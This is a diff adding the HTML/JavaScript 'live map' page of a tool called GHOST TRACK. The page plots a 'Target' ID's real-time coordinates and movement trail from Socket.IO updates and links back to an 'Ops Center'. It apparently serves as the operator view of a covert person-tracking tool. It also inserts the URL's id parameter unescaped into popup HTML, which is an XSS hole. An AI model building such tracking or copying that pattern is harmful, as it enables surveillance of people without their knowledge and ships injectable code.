@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GHOST TRACK — Live Map</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/style.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+    <style>
+        html, body {
+            height: 100%;
+            overflow: hidden;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            background: var(--bg-base);
+        }
+
+        /* ===== TOP BAR ===== */
+        .map-topbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 1rem;
+            height: 52px;
+            background: var(--bg-surface);
+            border-bottom: 1px solid var(--border-normal);
+            flex-shrink: 0;
+            gap: 0.75rem;
+            flex-wrap: nowrap;
+            overflow: hidden;
+        }
+
+        .topbar-left {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            min-width: 0;
+        }
+
+        .back-btn {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            padding: 0.4rem 0.75rem;
+            background: var(--bg-panel);
+            border: 1px solid var(--border-normal);
+            border-radius: var(--radius-sm);
+            color: var(--text-secondary);
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            text-decoration: none;
+            transition: all var(--transition-fast);
+            white-space: nowrap;
+            flex-shrink: 0;
+        }
+
+        .back-btn:hover {
+            border-color: var(--accent-green);
+            color: var(--accent-green);
+            text-decoration: none;
+        }
+
+        .back-btn svg { width: 13px; height: 13px; }
+
+        .target-info {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            min-width: 0;
+        }
+
+        .target-label {
+            font-family: var(--font-mono);
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            flex-shrink: 0;
+        }
+
+        .target-id-display {
+            font-family: var(--font-mono);
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: var(--accent-cyan);
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .topbar-center {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            flex-shrink: 0;
+        }
+
+        .status-pill {
+            display: flex;
+            align-items: center;
+            gap: 0.35rem;
+            padding: 0.25rem 0.65rem;
+            border-radius: 999px;
+            font-family: var(--font-mono);
+            font-size: 0.68rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.07em;
+            transition: all var(--transition-mid);
+        }
+
+        .status-pill.active {
+            background: rgba(0,255,136,0.1);
+            border: 1px solid rgba(0,255,136,0.4);
+            color: var(--accent-green);
+        }
+
+        .status-pill.updating {
+            background: rgba(0,212,255,0.1);
+            border: 1px solid rgba(0,212,255,0.4);
+            color: var(--accent-cyan);
+        }
+
+        .status-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: currentColor;
+        }
+
+        .status-pill.active .status-dot {
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .topbar-right {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            flex-shrink: 0;
+        }
+
+        .coord-chip {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            padding: 0.25rem 0.65rem;
+            background: var(--bg-panel);
+            border: 1px solid var(--border-normal);
+            border-radius: var(--radius-sm);
+            font-family: var(--font-mono);
+            font-size: 0.72rem;
+            color: var(--text-secondary);
+        }
+
+        .coord-chip span {
+            color: var(--accent-cyan);
+        }
+
+        /* ===== INFO OVERLAY (bottom-left of map) ===== */
+        .map-info-panel {
+            position: absolute;
+            bottom: 1.5rem;
+            left: 1rem;
+            z-index: 1000;
+            background: rgba(10, 12, 15, 0.9);
+            backdrop-filter: blur(8px);
+            border: 1px solid var(--border-normal);
+            border-radius: var(--radius-md);
+            padding: 0.75rem 1rem;
+            min-width: 200px;
+            pointer-events: none;
+        }
+
+        .info-panel-title {
+            font-family: var(--font-mono);
+            font-size: 0.65rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            margin-bottom: 0.5rem;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            gap: 1rem;
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            margin-bottom: 0.2rem;
+        }
+
+        .info-key   { color: var(--text-muted); }
+        .info-val   { color: var(--accent-cyan); }
+
+        /* ===== UPDATE FLASH ===== */
+        #update-flash {
+            position: absolute;
+            top: 1rem;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 1001;
+            background: rgba(0,255,136,0.12);
+            border: 1px solid rgba(0,255,136,0.5);
+            border-radius: var(--radius-md);
+            padding: 0.4rem 1rem;
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            color: var(--accent-green);
+            display: none;
+            align-items: center;
+            gap: 0.5rem;
+            pointer-events: none;
+        }
+
+        #update-flash.visible { display: flex; }
+
+        .flash-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: var(--accent-green);
+            animation: pulse 0.75s ease-in-out infinite;
+        }
+
+        /* ===== MAP WRAPPER ===== */
+        .map-wrapper {
+            flex: 1;
+            position: relative;
+            overflow: hidden;
+        }
+
+        #map {
+            width: 100%;
+            height: 100%;
+        }
+
+        /* Custom Leaflet tile — CartoDB Dark Matter (no filter needed, already dark) */
+
+        /* ===== COPY COORDS BUTTON (inside map info panel) ===== */
+        .copy-coords-btn {
+            pointer-events: auto;
+            margin-top: 0.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.35rem;
+            width: 100%;
+            padding: 0.3rem 0.5rem;
+            background: transparent;
+            border: 1px solid var(--border-normal);
+            border-radius: var(--radius-sm);
+            color: var(--text-secondary);
+            font-family: var(--font-mono);
+            font-size: 0.68rem;
+            cursor: pointer;
+            transition: all var(--transition-fast);
+        }
+
+        .copy-coords-btn:hover {
+            border-color: var(--accent-green);
+            color: var(--accent-green);
+        }
+
+        .copy-coords-btn svg { width: 11px; height: 11px; }
+
+        /* Google Maps Button */
+        .gmaps-btn {
+            pointer-events: auto;
+            margin-top: 0.4rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.4rem;
+            width: 100%;
+            padding: 0.35rem 0.5rem;
+            background: rgba(66, 133, 244, 0.12);
+            border: 1px solid rgba(66, 133, 244, 0.4);
+            border-radius: var(--radius-sm);
+            color: #64a2ff;
+            font-family: var(--font-mono);
+            font-size: 0.68rem;
+            text-decoration: none;
+            transition: all var(--transition-fast);
+        }
+
+        .gmaps-btn:hover {
+            background: rgba(66, 133, 244, 0.25);
+            border-color: #64a2ff;
+            color: #ffffff;
+            text-decoration: none;
+        }
+
+        .gmaps-btn svg { width: 12px; height: 12px; }
+
+        /* Leaflet layer control theme */
+        .leaflet-control-layers {
+            background: rgba(15, 19, 24, 0.95) !important;
+            backdrop-filter: blur(8px);
+            border: 1px solid var(--border-normal) !important;
+            border-radius: var(--radius-md) !important;
+            color: var(--text-primary) !important;
+            font-family: var(--font-mono) !important;
+            font-size: 0.72rem !important;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.5) !important;
+        }
+
+        .leaflet-control-layers-expanded {
+            padding: 0.6rem 0.8rem !important;
+        }
+
+        .leaflet-control-layers-base label {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            margin-bottom: 0.3rem;
+            cursor: pointer;
+        }
+
+        /* Leaflet marker override */
+        .leaflet-marker-icon {
+            filter: hue-rotate(100deg);
+        }
+
+        /* Update count badge */
+        .update-count {
+            font-family: var(--font-mono);
+            font-size: 0.65rem;
+            color: var(--text-muted);
+        }
+
+        @media (max-width: 600px) {
+            .coord-chip { display: none; }
+            .target-label { display: none; }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- ===== TOP BAR ===== -->
+    <div class="map-topbar" role="banner">
+        <div class="topbar-left">
+            <a href="/" class="back-btn" title="Back to Operations Center" aria-label="Back to Operations Center">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M10.5 19.5L3 12m0 0l7.5-7.5M3 12h18" />
+                </svg>
+                OPS CENTER
+            </a>
+
+            <div class="target-info">
+                <span class="target-label">Target:</span>
+                <span class="target-id-display" id="targetIdDisplay" aria-label="Target ID"></span>
+            </div>
+        </div>
+
+        <div class="topbar-center">
+            <div class="status-pill active" id="statusPill" role="status" aria-live="polite">
+                <span class="status-dot" aria-hidden="true"></span>
+                <span id="statusText">Tracking</span>
+            </div>
+        </div>
+
+        <div class="topbar-right">
+            <div class="coord-chip" id="latChip" aria-label="Current latitude">
+                LAT <span id="latVal">—</span>
+            </div>
+            <div class="coord-chip" id="lngChip" aria-label="Current longitude">
+                LNG <span id="lngVal">—</span>
+            </div>
+            <span class="update-count" id="updateCount" aria-live="polite">0 updates</span>
+        </div>
+    </div>
+
+    <!-- ===== MAP AREA ===== -->
+    <div class="map-wrapper" role="main" aria-label="Live location map">
+        <!-- Update flash notification -->
+        <div id="update-flash" aria-live="polite">
+            <span class="flash-dot" aria-hidden="true"></span>
+            Location updated
+        </div>
+
+        <!-- Leaflet Map -->
+        <div id="map" aria-label="Interactive map showing target location"></div>
+
+        <!-- Info overlay panel -->
+        <div class="map-info-panel" aria-label="Location details">
+            <div class="info-panel-title">// Location Data</div>
+            <div class="info-row">
+                <span class="info-key">Target</span>
+                <span class="info-val" id="panelId">—</span>
+            </div>
+            <div class="info-row">
+                <span class="info-key">Latitude</span>
+                <span class="info-val" id="panelLat">—</span>
+            </div>
+            <div class="info-row">
+                <span class="info-key">Longitude</span>
+                <span class="info-val" id="panelLng">—</span>
+            </div>
+            <div class="info-row">
+                <span class="info-key">Last Update</span>
+                <span class="info-val" id="panelTime">—</span>
+            </div>
+            <button class="copy-coords-btn" id="copyCoordsBtn" title="Copy coordinates" aria-label="Copy coordinates to clipboard">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M8.25 7.5V6.108c0-1.135.845-2.098 1.976-2.192.373-.03.748-.057 1.123-.08M15.75 18H18a2.25 2.25 0 002.25-2.25V6.108c0-1.135-.845-2.098-1.976-2.192a48.424 48.424 0 00-1.123-.08M15.75 18.75v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5A3.375 3.375 0 006.375 7.5H5.25m11.9-3.664A2.251 2.251 0 0015 2.25h-1.5a2.251 2.251 0 00-2.085 1.836" />
+                </svg>
+                Copy Coordinates
+            </button>
+            <a class="gmaps-btn" id="gmapsLink" target="_blank" rel="noopener noreferrer" title="Open precise coordinates in Google Maps">
+                <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+                    <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
+                </svg>
+                Open in Google Maps ↗
+            </a>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
+    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+    <script>
+        // ===== Init =====
+        const id = new URLSearchParams(location.search).get('id') || '';
+        const latLng = JSON.parse('{{ data }}');
+        let updateCount = 0;
+        let currentLat = latLng[0];
+        let currentLng = latLng[1];
+        let flashTimer = null;
+
+        // ===== DOM refs =====
+        const statusPill    = document.getElementById('statusPill');
+        const statusText    = document.getElementById('statusText');
+        const latValEl      = document.getElementById('latVal');
+        const lngValEl      = document.getElementById('lngVal');
+        const panelId       = document.getElementById('panelId');
+        const panelLat      = document.getElementById('panelLat');
+        const panelLng      = document.getElementById('panelLng');
+        const panelTime     = document.getElementById('panelTime');
+        const updateCountEl = document.getElementById('updateCount');
+        const updateFlash   = document.getElementById('update-flash');
+
+        // Set target ID displays
+        document.getElementById('targetIdDisplay').textContent = id;
+        panelId.textContent = id;
+
+        // ===== Populate initial coords =====
+        function setCoords(lat, lng) {
+            const fLat = parseFloat(lat).toFixed(6);
+            const fLng = parseFloat(lng).toFixed(6);
+            latValEl.textContent  = fLat;
+            lngValEl.textContent  = fLng;
+            panelLat.textContent  = fLat;
+            panelLng.textContent  = fLng;
+            panelTime.textContent = new Date().toLocaleTimeString('en-GB', { hour12: false });
+            currentLat = lat;
+            currentLng = lng;
+
+            const gmapsLink = document.getElementById('gmapsLink');
+            if (gmapsLink) {
+                gmapsLink.href = `https://www.google.com/maps?q=${lat},${lng}`;
+            }
+        }
+
+        setCoords(latLng[0], latLng[1]);
+
+        // ===== Leaflet Map with Google Maps =====
+        const map = L.map('map', {
+            zoomControl: true,
+            attributionControl: true
+        }).setView(latLng, 15);
+
+        // Google Maps Tile Layers
+        const googleHybrid = L.tileLayer('https://mt{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {
+            maxZoom: 21,
+            subdomains: ['0', '1', '2', '3'],
+            attribution: '&copy; Google Maps'
+        });
+
+        const googleStreets = L.tileLayer('https://mt{s}.google.com/vt/lyrs=m&x={x}&y={y}&z={z}', {
+            maxZoom: 21,
+            subdomains: ['0', '1', '2', '3'],
+            attribution: '&copy; Google Maps'
+        });
+
+        const googleSatellite = L.tileLayer('https://mt{s}.google.com/vt/lyrs=s&x={x}&y={y}&z={z}', {
+            maxZoom: 21,
+            subdomains: ['0', '1', '2', '3'],
+            attribution: '&copy; Google Maps'
+        });
+
+        const googleTerrain = L.tileLayer('https://mt{s}.google.com/vt/lyrs=p&x={x}&y={y}&z={z}', {
+            maxZoom: 21,
+            subdomains: ['0', '1', '2', '3'],
+            attribution: '&copy; Google Maps'
+        });
+
+        const cartoDark = L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+            maxZoom: 19,
+            subdomains: 'abcd',
+            attribution: '&copy; CARTO'
+        });
+
+        // Default to Google Maps Hybrid (satellite + road labels)
+        googleHybrid.addTo(map);
+
+        // Layer Switcher Control
+        const baseMaps = {
+            "Google Maps (Hybrid)": googleHybrid,
+            "Google Maps (Roadmap)": googleStreets,
+            "Google Maps (Satellite)": googleSatellite,
+            "Google Maps (Terrain)": googleTerrain,
+            "Tactical Dark (CARTO)": cartoDark
+        };
+        L.control.layers(baseMaps, null, { position: 'topright' }).addTo(map);
+
+        // Custom icon for better hacker theme
+        const customIcon = L.divIcon({
+            className: '',
+            html: `
+                <div style="
+                    width:16px; height:16px;
+                    background: var(--accent-green, #00ff88);
+                    border: 2px solid #000;
+                    border-radius: 50%;
+                    box-shadow: 0 0 12px rgba(0,255,136,0.8), 0 0 4px rgba(0,255,136,1);
+                "></div>`,
+            iconSize: [16, 16],
+            iconAnchor: [8, 8]
+        });
+
+        const marker = L.marker(latLng, { icon: customIcon }).addTo(map);
+        marker.bindPopup(`<b style="font-family:monospace">ID: ${id}</b>`);
+
+        // Accuracy circle
+        let accuracyCircle = L.circle(latLng, {
+            color: '#00ff88',
+            fillColor: '#00ff8820',
+            fillOpacity: 0.15,
+            weight: 1,
+            radius: 50
+        }).addTo(map);
+
+        // Breadcrumb trail (last 10 positions)
+        const trail = [];
+        const maxTrail = 10;
+        let polyline = null;
+
+        function updateTrail(lat, lng) {
+            trail.push([lat, lng]);
+            if (trail.length > maxTrail) trail.shift();
+
+            if (polyline) map.removeLayer(polyline);
+            if (trail.length > 1) {
+                polyline = L.polyline(trail, {
+                    color: '#00d4ff',
+                    weight: 2,
+                    opacity: 0.5,
+                    dashArray: '4 4'
+                }).addTo(map);
+            }
+        }
+
+        updateTrail(latLng[0], latLng[1]);
+
+        // ===== Status helpers =====
+        function setStatusUpdating() {
+            statusPill.className = 'status-pill updating';
+            statusText.textContent = 'Updating';
+        }
+
+        function setStatusTracking() {
+            statusPill.className = 'status-pill active';
+            statusText.textContent = 'Tracking';
+        }
+
+        // ===== Update flash =====
+        function showFlash() {
+            updateFlash.classList.add('visible');
+            if (flashTimer) clearTimeout(flashTimer);
+            flashTimer = setTimeout(() => updateFlash.classList.remove('visible'), 2500);
+        }
+
+        // ===== Copy coordinates =====
+        document.getElementById('copyCoordsBtn').addEventListener('click', async () => {
+            const text = `${parseFloat(currentLat).toFixed(6)}, ${parseFloat(currentLng).toFixed(6)}`;
+            try {
+                await navigator.clipboard.writeText(text);
+                document.getElementById('copyCoordsBtn').textContent = '✓ Copied!';
+                setTimeout(() => {
+                    document.getElementById('copyCoordsBtn').innerHTML = `
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M8.25 7.5V6.108c0-1.135.845-2.098 1.976-2.192.373-.03.748-.057 1.123-.08M15.75 18H18a2.25 2.25 0 002.25-2.25V6.108c0-1.135-.845-2.098-1.976-2.192a48.424 48.424 0 00-1.123-.08M15.75 18.75v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5A3.375 3.375 0 006.375 7.5H5.25m11.9-3.664A2.251 2.251 0 0015 2.25h-1.5a2.251 2.251 0 00-2.085 1.836" />
+                        </svg>
+                        Copy Coordinates`;
+                }, 2000);
+            } catch (e) {
+                // Clipboard not available
+            }
+        });
+
+        // ===== Socket.IO =====
+        const socket = io("", {
+            secure: true,
+            path: "/socket.io",
+            transports: ['websocket']
+        });
+
+        socket.on('map-data', data => {
+            if (data.id !== id) return;
+
+            setStatusUpdating();
+
+            // Update marker + map view
+            const newLatLng = [data.lat, data.lng];
+            marker.setLatLng(newLatLng);
+            map.panTo(newLatLng, { animate: true, duration: 0.8 });
+            accuracyCircle.setLatLng(newLatLng);
+            updateTrail(data.lat, data.lng);
+
+            // Update display
+            setCoords(data.lat, data.lng);
+            updateCount++;
+            updateCountEl.textContent = updateCount + (updateCount === 1 ? ' update' : ' updates');
+
+            showFlash();
+
+            // Reset status back to tracking after 2.5s
+            setTimeout(setStatusTracking, 2500);
+        });
+
+        socket.on('disconnect', () => {
+            statusPill.className = 'status-pill';
+            statusPill.style.background = 'rgba(255,68,68,0.1)';
+            statusPill.style.borderColor = 'rgba(255,68,68,0.4)';
+            statusPill.style.color = 'var(--accent-red)';
+            statusText.textContent = 'Disconnected';
+        });
+    </script>
+</body>
+
+</html>
